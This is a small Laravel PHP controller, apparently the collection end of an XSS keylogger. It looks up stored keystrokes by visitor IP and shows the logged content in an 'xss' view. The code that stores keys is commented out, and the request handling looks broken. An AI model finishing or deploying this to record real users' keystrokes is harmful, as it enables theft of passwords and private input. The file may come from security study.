<?php

namespace App\Http\Controllers;

use App\KeyLogger;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;

class XssController extends Controller
{
    function index(Request $request) {
        $keyLogger = KeyLogger::where('ip', $request->ip())->first();
        $request = json_decode($request);
//        if ($keyLogger != null) {
//            $keyLogger->content .= $request->key;
//            $keyLogger->save();
//        } else {
//            $keyLogger = KeyLogger::create([
//                'ip' => $request->ip(),
//                'content' => $request->key
//            ]);
//        }
        return $request;
    }

    function home(Request $request) {
        $keyLogger = KeyLogger::first();

        return view('xss', compact('keyLogger'));
    }
}
